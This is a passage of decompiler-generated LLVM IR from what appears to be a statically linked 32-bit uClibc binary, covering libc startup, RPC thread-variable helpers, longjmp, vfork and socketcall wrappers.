  %v12_806196a = icmp eq i32 %v5_8061962, %v1_806196a
  br i1 %v12_806196a, label %dec_label_pc_8061973, label %dec_label_pc_806196e

dec_label_pc_806196e:                             ; preds = %dec_label_pc_806195a
  %v0_806196e = call i32 @abort()
  br label %dec_label_pc_8061973

dec_label_pc_8061973:                             ; preds = %dec_label_pc_806195a, %entry, %dec_label_pc_806196e
  %v2_8061973 = load i32, i32* %stack_var_-12, align 4
  %v2_8061974 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8061974, i32* @ebx, align 4
  store i32 %v0_8061943, i32* @esi, align 4
  ret i32 %v2_8061973

; uselistorder directives
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 4, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8061973, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_806197a = load i8, i8* @global_var_807df20.720, align 32
  %v1_806197a = icmp eq i8 %v0_806197a, 0
  %v1_8061981 = icmp eq i1 %v1_806197a, false
  br i1 %v1_8061981, label %entry.dec_label_pc_80619b3_crit_edge, label %dec_label_pc_8061983

entry.dec_label_pc_80619b3_crit_edge:             ; preds = %entry
  %v0_80619b6.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_80619b3

dec_label_pc_8061983:                             ; preds = %entry
  store i8 1, i8* @global_var_807df20.720, align 32
  store i32 4096, i32* @global_var_807df14.588, align 4
  %v0_806199d = call i32 @__pthread_initialize_minimal()
  %v0_80619ae = call i32 @_stdio_init()
  br label %dec_label_pc_80619b3

dec_label_pc_80619b3:                             ; preds = %entry.dec_label_pc_80619b3_crit_edge, %dec_label_pc_8061983
  %v0_80619b6 = phi i32 [ %v0_80619b6.pre, %entry.dec_label_pc_80619b3_crit_edge ], [ %v0_80619ae, %dec_label_pc_8061983 ]
  ret i32 %v0_80619b6

; uselistorder directives
  uselistorder i8* @global_var_807df20.720, { 1, 0 }
  uselistorder label %dec_label_pc_80619b3, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_80619b8 = load i32, i32* @edi, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg7, i32* @global_var_807df0c.721, align 4
  store i32 %arg6, i32* @global_var_807df1c.718, align 4
  %v2_80619ee = mul i32 %arg2, 4
  %v3_80619ee = add i32 %tmp29, %v2_80619ee
  store i32 %v3_80619ee, i32* %eax.global-to-local, align 4
  %v1_80619f1 = add i32 %v3_80619ee, 4
  store i32 %v1_80619f1, i32* @global_var_807df10.712, align 16
  %v3_80619fa = load i32, i32* %arg3, align 4
  %v14_80619fa = icmp eq i32 %v1_80619f1, %v3_80619fa
  store i32 0, i32* %stack_var_-168, align 4
  %v1_8061a00 = icmp eq i1 %v14_80619fa, false
  %v4_8061a00 = select i1 %v1_8061a00, i32 %v1_80619f1, i32 %v3_80619ee
  store i32 %v4_8061a00, i32* @global_var_807df10.712, align 16
  %v2_8061a08 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8061a08, i32* %eax.global-to-local, align 4
  %v3_8061a0d = bitcast i32* %stack_var_-136 to i8*
  %v4_8061a0d = call i32 @__GI_memset(i8* %v3_8061a0d, i32 0, i32 120)
  %v0_8061a12 = load i32, i32* @global_var_807df10.712, align 16
  store i32 %v0_8061a12, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061a1a

dec_label_pc_8061a1a:                             ; preds = %dec_label_pc_8061a1a, %entry
  %v0_8061a1a = phi i32 [ %v1_8061a1d, %dec_label_pc_8061a1a ], [ %v0_8061a12, %entry ]
  %v1_8061a1a = inttoptr i32 %v0_8061a1a to i32*
  %v2_8061a1a = load i32, i32* %v1_8061a1a, align 4
  %v3_8061a1a = icmp eq i32 %v2_8061a1a, 0
  %v1_8061a1d = add i32 %v0_8061a1a, 4
  store i32 %v1_8061a1d, i32* %eax.global-to-local, align 4
  %v1_8061a20 = icmp eq i1 %v3_8061a1a, false
  br i1 %v1_8061a20, label %dec_label_pc_8061a1a, label %dec_label_pc_8061a41.preheader

dec_label_pc_8061a41.preheader:                   ; preds = %dec_label_pc_8061a1a
  store i32 %v1_8061a1d, i32* @ebx, align 4
  %v1_8061a411 = inttoptr i32 %v1_8061a1d to i32*
  %v2_8061a412 = load i32, i32* %v1_8061a411, align 4
  %v3_8061a413 = icmp eq i32 %v2_8061a412, 0
  %v1_8061a4410 = icmp eq i1 %v3_8061a413, false
  br i1 %v1_8061a4410, label %dec_label_pc_8061a26.lr.ph, label %dec_label_pc_8061a46

dec_label_pc_8061a26.lr.ph:                       ; preds = %dec_label_pc_8061a41.preheader
  %v3_80619fe = ptrtoint i32* %stack_var_-168 to i32
  %v3_8061a31 = add i32 %v3_80619fe, 32
  br label %dec_label_pc_8061a26

dec_label_pc_8061a26:                             ; preds = %dec_label_pc_8061a26.lr.ph, %dec_label_pc_8061a3e
  %v1_8061a31 = phi i32 [ %v2_8061a412, %dec_label_pc_8061a26.lr.ph ], [ %v2_8061a41, %dec_label_pc_8061a3e ]
  %v0_8061a30 = phi i32 [ %v1_8061a1d, %dec_label_pc_8061a26.lr.ph ], [ %v1_8061a3e, %dec_label_pc_8061a3e ]
  store i32 %v1_8061a31, i32* %eax.global-to-local, align 4
  %v6_8061a2b = icmp ugt i32 %v1_8061a31, 14
  br i1 %v6_8061a2b, label %dec_label_pc_8061a3e, label %dec_label_pc_8061a2d

dec_label_pc_8061a2d:                             ; preds = %dec_label_pc_8061a26
  store i32 %v0_8061a30, i32* %stack_var_-168, align 4
  %v2_8061a31 = mul i32 %v1_8061a31, 8
  %v4_8061a31 = add i32 %v3_8061a31, %v2_8061a31
  store i32 %v4_8061a31, i32* %eax.global-to-local, align 4
  %v3_8061a36 = inttoptr i32 %v4_8061a31 to i16*
  %v4_8061a36 = call i32 @memcpy(i16* %v3_8061a36, i32 %v0_8061a30, i32 8)
  store i32 %v4_8061a36, i32* %eax.global-to-local, align 4
  %v0_8061a3e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061a3e

dec_label_pc_8061a3e:                             ; preds = %dec_label_pc_8061a26, %dec_label_pc_8061a2d
  %v0_8061a3e = phi i32 [ %v0_8061a30, %dec_label_pc_8061a26 ], [ %v0_8061a3e.pre, %dec_label_pc_8061a2d ]
  %v1_8061a3e = add i32 %v0_8061a3e, 8
  store i32 %v1_8061a3e, i32* @ebx, align 4
  %v1_8061a41 = inttoptr i32 %v1_8061a3e to i32*
  %v2_8061a41 = load i32, i32* %v1_8061a41, align 4
  %v3_8061a41 = icmp eq i32 %v2_8061a41, 0
  %v1_8061a44 = icmp eq i1 %v3_8061a41, false
  br i1 %v1_8061a44, label %dec_label_pc_8061a26, label %dec_label_pc_8061a46

dec_label_pc_8061a46:                             ; preds = %dec_label_pc_8061a3e, %dec_label_pc_8061a41.preheader
  store i32 %v2_8061a08, i32* @eax, align 4
  %v0_8061a4a = call i32 @_dl_aux_init()
  store i32 %v0_8061a4a, i32* @eax, align 4
  %v0_8061a4f = call i32 @__GI___uClibc_init()
  %v1_8061a5d = icmp eq i32 %tmp24, 0
  %v3_8061a5f = select i1 %v1_8061a5d, i32 4096, i32 %tmp24
  store i32 %v3_8061a5f, i32* %eax.global-to-local, align 4
  %v13_8061a62 = icmp eq i32 %tmp23, -1
  store i32 %v3_8061a5f, i32* @global_var_807df14.588, align 4
  %v1_8061a6c = icmp eq i1 %v13_8061a62, false
  br i1 %v1_8061a6c, label %dec_label_pc_8061a97, label %dec_label_pc_8061a6e

dec_label_pc_8061a6e:                             ; preds = %dec_label_pc_8061a46
  %v0_8061a6e = call i32 @getuid()
  store i32 %v0_8061a6e, i32* %eax.global-to-local, align 4
  store i32 %v0_8061a6e, i32* @ebx, align 4
  %v0_8061a75 = call i32 @geteuid()
  store i32 %v0_8061a75, i32* %eax.global-to-local, align 4
  %v0_8061a7a = load i32, i32* @ebx, align 4
  %v12_8061a7a = icmp eq i32 %v0_8061a7a, %v0_8061a75
  %v1_8061a7c = icmp eq i1 %v12_8061a7a, false
  br i1 %v1_8061a7c, label %dec_label_pc_8061aad, label %dec_label_pc_8061a7e

dec_label_pc_8061a7e:                             ; preds = %dec_label_pc_8061a6e
  %v0_8061a7e = call i32 @getgid()
  store i32 %v0_8061a7e, i32* %eax.global-to-local, align 4
  store i32 %v0_8061a7e, i32* @ebx, align 4
  %v0_8061a85 = call i32 @getegid()
  store i32 %v0_8061a85, i32* %eax.global-to-local, align 4
  %v0_8061a8a = load i32, i32* @ebx, align 4
  %v12_8061a8a = icmp eq i32 %v0_8061a8a, %v0_8061a85
  %v1_8061a8c = icmp eq i1 %v12_8061a8a, false
  br i1 %v1_8061a8c, label %dec_label_pc_8061aad, label %dec_label_pc_8061a8e.thread

dec_label_pc_8061a8e.thread:                      ; preds = %dec_label_pc_8061a7e
  br label %dec_label_pc_8061ad7

dec_label_pc_8061a97:                             ; preds = %dec_label_pc_8061a46
  store i32 %tmp23, i32* %eax.global-to-local, align 4
  %v15_8061a97 = icmp eq i32 %tmp23, %tmp22
  %v1_8061a9b = icmp eq i1 %v15_8061a97, false
  br i1 %v1_8061a9b, label %dec_label_pc_8061aad, label %dec_label_pc_8061a9d

dec_label_pc_8061a9d:                             ; preds = %dec_label_pc_8061a97
  br label %dec_label_pc_8061aad

dec_label_pc_8061aad:                             ; preds = %dec_label_pc_8061a9d, %dec_label_pc_8061a97, %dec_label_pc_8061a7e, %dec_label_pc_8061a6e
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8061ab4 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8061ac3 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8061ad2 = call i32 @__check_one_fd()
  br label %dec_label_pc_8061ad7

dec_label_pc_8061ad7:                             ; preds = %dec_label_pc_8061a8e.thread, %dec_label_pc_8061aad
  %storemerge = phi i32 [ %tmp23, %dec_label_pc_8061a8e.thread ], [ %v0_8061ad2, %dec_label_pc_8061aad ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_8061ad7 = load i32, i32* @edi, align 4
  %v1_8061ad7 = inttoptr i32 %v0_8061ad7 to i32*
  %v2_8061ad7 = load i32, i32* %v1_8061ad7, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_8061ad7, i32* inttoptr (i32 134698552 to i32*), align 8
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @global_var_807df18.717, align 8
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 0), label %dec_label_pc_8061afc, label %dec_label_pc_8061b08

dec_label_pc_8061afc:                             ; preds = %dec_label_pc_8061ad7, %dec_label_pc_8061afc
  %v4_8061afc54 = phi i32 [ %v1_8061b03, %dec_label_pc_8061afc ], [ 0, %dec_label_pc_8061ad7 ]
  %v5_8061afc = mul i32 %v4_8061afc54, 4
  %v6_8061afc = add i32 %v5_8061afc, ptrtoint (i32* @global_var_8070628.715 to i32)
  %v7_8061afc = inttoptr i32 %v6_8061afc to i32*
  %v8_8061afc = load i32, i32* %v7_8061afc, align 4
  call void @__pseudo_call(i32 %v8_8061afc)
  %v0_8061b03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061b03 = add i32 %v0_8061b03, 1
  store i32 %v1_8061b03, i32* %ebx.global-to-local, align 4
  %v1_8061b04 = load i32, i32* %esi.global-to-local, align 4
  %v7_8061b04 = icmp ult i32 %v1_8061b03, %v1_8061b04
  br i1 %v7_8061b04, label %dec_label_pc_8061afc, label %dec_label_pc_8061b08

dec_label_pc_8061b08:                             ; preds = %dec_label_pc_8061afc, %dec_label_pc_8061ad7
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 0), label %dec_label_pc_8061b20, label %dec_label_pc_8061b2c

dec_label_pc_8061b20:                             ; preds = %dec_label_pc_8061b08, %dec_label_pc_8061b20
  %v4_8061b2044 = phi i32 [ %v1_8061b27, %dec_label_pc_8061b20 ], [ 0, %dec_label_pc_8061b08 ]
  store i32 ptrtoint (i32* @global_var_8061b27.724 to i32), i32* %stack_var_-168, align 4
  %v5_8061b20 = mul i32 %v4_8061b2044, 4
  %v6_8061b20 = add i32 %v5_8061b20, ptrtoint (i32* @global_var_8070628.715 to i32)
  %v7_8061b20 = inttoptr i32 %v6_8061b20 to i32*
  %v8_8061b20 = load i32, i32* %v7_8061b20, align 4
  call void @__pseudo_call(i32 %v8_8061b20)
  %v0_8061b27 = load i32, i32* @ebx, align 4
  %v1_8061b27 = add i32 %v0_8061b27, 1
  store i32 %v1_8061b27, i32* @ebx, align 4
  %v1_8061b28.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8061b28 = icmp ult i32 %v1_8061b27, %v1_8061b28.pre
  br i1 %v7_8061b28, label %dec_label_pc_8061b20, label %dec_label_pc_8061b2c

dec_label_pc_8061b2c:                             ; preds = %dec_label_pc_8061b20, %dec_label_pc_8061b08
  store i32 134574238, i32* %eax.global-to-local, align 4
  %v0_8061b35 = load i32, i32* %stack_var_-168, align 4
  %v1_8061b35 = call i32 @__errno_location(i32 %v0_8061b35)
  %v1_8061b3a = inttoptr i32 %v1_8061b35 to i32*
  store i32 0, i32* %v1_8061b3a, align 4
  store i32 134574223, i32* %eax.global-to-local, align 4
  %v0_8061b49 = call i32 @__h_errno_location()
  store i32 %v0_8061b49, i32* %eax.global-to-local, align 4
  %v1_8061b4e = inttoptr i32 %v0_8061b49 to i32*
  store i32 0, i32* %v1_8061b4e, align 4
  %v0_8061b54 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8061b54, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_80619b8)
  %v0_8061b6a = load i32, i32* %eax.global-to-local, align 4
  %v1_8061b6d = call i32 @__GI_exit(i32 %v0_8061b6a)
  store i32 %v1_8061b6d, i32* %eax.global-to-local, align 4
  ret i32 %v1_8061b6d

; uselistorder directives
  uselistorder i32 %v1_8061b27, { 1, 2, 0 }
  uselistorder i32 %v1_8061b03, { 1, 2, 0 }
  uselistorder i32 %v2_8061a41, { 1, 0 }
  uselistorder i32 %v1_8061a3e, { 2, 1, 0 }
  uselistorder i32 %v1_8061a31, { 0, 2, 1 }
  uselistorder i32 %v1_8061a1d, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v0_8061a1a, { 1, 0 }
  uselistorder i32 %v1_80619f1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %tmp23, { 2, 0, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 4, 5, 6, 3, 7, 8, 0, 1, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8070628.715 to i32), { 1, 2, 3, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8070628.715 to i32), i32 -134678056), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8061b20, { 1, 0 }
  uselistorder label %dec_label_pc_8061afc, { 1, 0 }
  uselistorder label %dec_label_pc_8061ad7, { 1, 0 }
  uselistorder label %dec_label_pc_8061a3e, { 1, 0 }
  uselistorder label %dec_label_pc_8061a26, { 1, 0 }
}

define i32 @rpc_thread_multi() local_unnamed_addr {
dec_label_pc_8061b9d:
  %v4_8061b89 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_807df40.725 to i32), i32 134590483, i32 134590483)
  ret i32 %v4_8061b89
}

define i32 @__rpc_thread_variables(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8061ba1 = load i32, i32* @ebx, align 4
  %v1_8061bb3 = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_8061bc2 = icmp eq i32 %v1_8061bb3, 0
  store i32 %v1_8061bb3, i32* @ebx, align 4
  %v1_8061bc6 = icmp eq i1 %v1_8061bc2, false
  br i1 %v1_8061bc6, label %dec_label_pc_8061c7c, label %dec_label_pc_8061bcc

dec_label_pc_8061bcc:                             ; preds = %entry
  %v5_8061be1 = call i32 @pthread_once(i32* nonnull @global_var_807df24.727, i32 134617972, i32 134589892, i32 134589892)
  %v1_8061c11 = call i32 @__pthread_internal_tsd_get(i32 2)
  %v1_8061c20 = icmp eq i32 %v1_8061c11, 0
  store i32 %v1_8061c11, i32* @ebx, align 4
  %v1_8061c24 = icmp eq i1 %v1_8061c20, false
  br i1 %v1_8061c24, label %dec_label_pc_8061c7c, label %dec_label_pc_8061c26

dec_label_pc_8061c26:                             ; preds = %dec_label_pc_8061bcc
  %v5_8061c2f = call i32 @calloc(i64 1, i32 200, i32 %v1_8061c11, i32 %v1_8061c11)
  %v1_8061c37 = icmp eq i32 %v5_8061c2f, 0
  store i32 %v5_8061c2f, i32* %ebx.global-to-local, align 4
  br i1 %v1_8061c37, label %dec_label_pc_8061c5d, label %dec_label_pc_8061c3d

dec_label_pc_8061c3d:                             ; preds = %dec_label_pc_8061c26
  %v4_8061c4b = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v5_8061c2f, i32 134590483, i32 134590483)
  %v0_8061c7d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061c7c

dec_label_pc_8061c5d:                             ; preds = %dec_label_pc_8061c26
  %v1_8061c6b = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8061c6b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061c7c

dec_label_pc_8061c7c:                             ; preds = %dec_label_pc_8061bcc, %entry, %dec_label_pc_8061c3d, %dec_label_pc_8061c5d
  %v0_8061c7d = phi i32 [ %v1_8061c11, %dec_label_pc_8061bcc ], [ %v1_8061bb3, %entry ], [ %v0_8061c7d.pre, %dec_label_pc_8061c3d ], [ %v1_8061c6b, %dec_label_pc_8061c5d ]
  %v2_8061c7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061c7c, i32* @edx, align 4
  store i32 %v0_8061ba1, i32* @ebx, align 4
  ret i32 %v0_8061c7d

; uselistorder directives
  uselistorder label %dec_label_pc_8061c7c, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  %v1_8061c85 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8061c8f = icmp eq i32 %v1_8061c85, 134733632
  br i1 %v6_8061c8f, label %dec_label_pc_8061c9c, label %dec_label_pc_8061c96

dec_label_pc_8061c96:                             ; preds = %entry
  %v1_8061c96 = add i32 %v1_8061c85, 148
  br label %dec_label_pc_8061c9c

dec_label_pc_8061c9c:                             ; preds = %entry, %dec_label_pc_8061c96
  %v0_8061c9c = phi i32 [ ptrtoint (i32* @global_var_807f80c.728 to i32), %entry ], [ %v1_8061c96, %dec_label_pc_8061c96 ]
  ret i32 %v0_8061c9c

; uselistorder directives
  uselistorder i32 %v1_8061c85, { 1, 0 }
  uselistorder label %dec_label_pc_8061c9c, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  %v1_8061ca5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8061caf = icmp eq i32 %v1_8061ca5, 134733632
  br i1 %v6_8061caf, label %dec_label_pc_8061cbc, label %dec_label_pc_8061cb6

dec_label_pc_8061cb6:                             ; preds = %entry
  %v1_8061cb6 = add i32 %v1_8061ca5, 144
  br label %dec_label_pc_8061cbc

dec_label_pc_8061cbc:                             ; preds = %entry, %dec_label_pc_8061cb6
  %v0_8061cbc = phi i32 [ ptrtoint (i32* @global_var_807f820.729 to i32), %entry ], [ %v1_8061cb6, %dec_label_pc_8061cb6 ]
  ret i32 %v0_8061cbc

; uselistorder directives
  uselistorder i32 %v1_8061ca5, { 1, 0 }
  uselistorder label %dec_label_pc_8061cbc, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  %v1_8061cc5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8061ccf = icmp eq i32 %v1_8061cc5, 134733632
  br i1 %v6_8061ccf, label %dec_label_pc_8061cdc, label %dec_label_pc_8061cd6

dec_label_pc_8061cd6:                             ; preds = %entry
  %v1_8061cd6 = add i32 %v1_8061cc5, 128
  br label %dec_label_pc_8061cdc

dec_label_pc_8061cdc:                             ; preds = %entry, %dec_label_pc_8061cd6
  %storemerge = phi i32 [ %v1_8061cd6, %dec_label_pc_8061cd6 ], [ ptrtoint (i32* @global_var_807f810.730 to i32), %entry ]
  %v0_8061cdc = phi i32 [ %v1_8061cd6, %dec_label_pc_8061cd6 ], [ ptrtoint (i32* @global_var_807f810.730 to i32), %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8061cdc

; uselistorder directives
  uselistorder i32 %v1_8061cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8061cdc, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset() local_unnamed_addr {
entry:
  %v1_8061ce5 = call i32 @__rpc_thread_variables(i32 ptrtoint (i32* @0 to i32))
  %v6_8061cf1 = icmp eq i32 %v1_8061ce5, 134733632
  %v1_8061cf7 = icmp eq i1 %v6_8061cf1, false
  %v4_8061cf7 = select i1 %v1_8061cf7, i32 %v1_8061ce5, i32 ptrtoint (i32* @global_var_807f780.731 to i32)
  ret i32 %v4_8061cf7

; uselistorder directives
  uselistorder i32 %v1_8061ce5, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v1_8061d10 = call i32 @__pthread_internal_tsd_get(i32 2)
  store i32 %v1_8061d10, i32* @ebx, align 4
  %v1_8061d22 = icmp eq i32 %v1_8061d10, 0
  br i1 %v1_8061d22, label %dec_label_pc_8061db8, label %dec_label_pc_8061d2a

dec_label_pc_8061d2a:                             ; preds = %entry
  %v6_8061d2a = icmp eq i32 %v1_8061d10, 134733632
  br i1 %v6_8061d2a, label %dec_label_pc_8061db8, label %dec_label_pc_8061d36

dec_label_pc_8061d36:                             ; preds = %dec_label_pc_8061d2a
  %v0_8061d36 = call i32 @__rpc_thread_svc_cleanup()
  %v0_8061d3b = call i32 @__rpc_thread_clnt_cleanup()
  %v0_8061d43 = load i32, i32* @ebx, align 4
  %v1_8061d43 = add i32 %v0_8061d43, 152
  %v2_8061d43 = inttoptr i32 %v1_8061d43 to i32*
  %v3_8061d43 = load i32, i32* %v2_8061d43, align 4
  %v1_8061d49 = call i32 @free(i32 %v3_8061d43)
  %v0_8061d4f = load i32, i32* @ebx, align 4
  %v1_8061d4f = add i32 %v0_8061d4f, 156
  %v2_8061d4f = inttoptr i32 %v1_8061d4f to i32*
  %v3_8061d4f = load i32, i32* %v2_8061d4f, align 4
  %v1_8061d55 = call i32 @free(i32 %v3_8061d4f)
  %v0_8061d5b = load i32, i32* @ebx, align 4
  %v1_8061d5b = add i32 %v0_8061d5b, 160
  %v2_8061d5b = inttoptr i32 %v1_8061d5b to i32*
  %v3_8061d5b = load i32, i32* %v2_8061d5b, align 4
  %v1_8061d61 = call i32 @free(i32 %v3_8061d5b)
  %v0_8061d67 = load i32, i32* @ebx, align 4
  %v1_8061d67 = add i32 %v0_8061d67, 188
  %v2_8061d67 = inttoptr i32 %v1_8061d67 to i32*
  %v3_8061d67 = load i32, i32* %v2_8061d67, align 4
  %v1_8061d6d = call i32 @free(i32 %v3_8061d67)
  %v0_8061d73 = load i32, i32* @ebx, align 4
  %v1_8061d73 = add i32 %v0_8061d73, 172
  %v2_8061d73 = inttoptr i32 %v1_8061d73 to i32*
  %v3_8061d73 = load i32, i32* %v2_8061d73, align 4
  %v1_8061d79 = call i32 @free(i32 %v3_8061d73)
  %v0_8061d7f = load i32, i32* @ebx, align 4
  %v1_8061d7f = add i32 %v0_8061d7f, 176
  %v2_8061d7f = inttoptr i32 %v1_8061d7f to i32*
  %v3_8061d7f = load i32, i32* %v2_8061d7f, align 4
  %v1_8061d85 = call i32 @free(i32 %v3_8061d7f)
  %v0_8061d8a = load i32, i32* @ebx, align 4
  %v1_8061d8d = call i32 @free(i32 %v0_8061d8a)
  %v0_8061d9e = load i32, i32* @ecx, align 4
  %v4_8061da4 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 %v0_8061d9e, i32 %v0_8061d9e)
  br label %dec_label_pc_8061db8

dec_label_pc_8061db8:                             ; preds = %dec_label_pc_8061d2a, %entry, %dec_label_pc_8061d36
  %v2_8061db8 = load i32, i32* %stack_var_-12, align 4
  ret i32 %v2_8061db8

; uselistorder directives
  uselistorder i32 %v1_8061d10, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 2, 0, 1 }
  uselistorder i32 134733632, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8061db8, { 2, 0, 1 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v1_8061dc3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v0_8061dc8 = load i32, i32* @edx, align 4
  %v2_8061dc8 = inttoptr i32 %v1_8061dc3 to i32*
  store i32 %v0_8061dc8, i32* %v2_8061dc8, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v1_8061ddc = add i32 %tmp2, 20
  %v2_8061ddc = inttoptr i32 %v1_8061ddc to i32*
  %v3_8061ddc = load i32, i32* %v2_8061ddc, align 4
  call void @__pseudo_branch(i32 %v3_8061ddc)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ecx, align 4
  %v0_8061df6 = call i32 @vfork()
  %v5_8061df9 = icmp ult i32 %v0_8061df6, -4095
  %v1_8061dfe = icmp eq i1 %v5_8061df9, false
  call void @__pseudo_cond_branch(i1 %v1_8061dfe, i32 134618556)
  ret i32 %v0_8061df6
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061e08 = load i32, i32* @ebx, align 4
  store i32 %v0_8061e08, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8061e1b = call i32 @int80_syscall(i32 102)
  store i32 %v1_8061e1b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061e1b, -4095
  br i1 %tmp, label %dec_label_pc_8061e34, label %dec_label_pc_8061e28

dec_label_pc_8061e28:                             ; preds = %entry
  %v0_8061e28 = load i32, i32* %stack_var_-4, align 4
  %v1_8061e28 = call i32 @__errno_location(i32 %v0_8061e28)
  %v0_8061e2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061e2d = sub i32 0, %v0_8061e2d
  %v2_8061e2f = inttoptr i32 %v1_8061e28 to i32*
  store i32 %v1_8061e2d, i32* %v2_8061e2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061e34

dec_label_pc_8061e34:                             ; preds = %entry, %dec_label_pc_8061e28
  %v0_8061e35 = phi i32 [ %v1_8061e1b, %entry ], [ -1, %dec_label_pc_8061e28 ]
  %v2_8061e34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061e34, i32* @edx, align 4
  %v2_8061e38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061e38, i32* @ebx, align 4
  ret i32 %v0_8061e35

; uselistorder directives
  uselistorder i32 %v1_8061e1b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061e34, { 1, 0 }
}

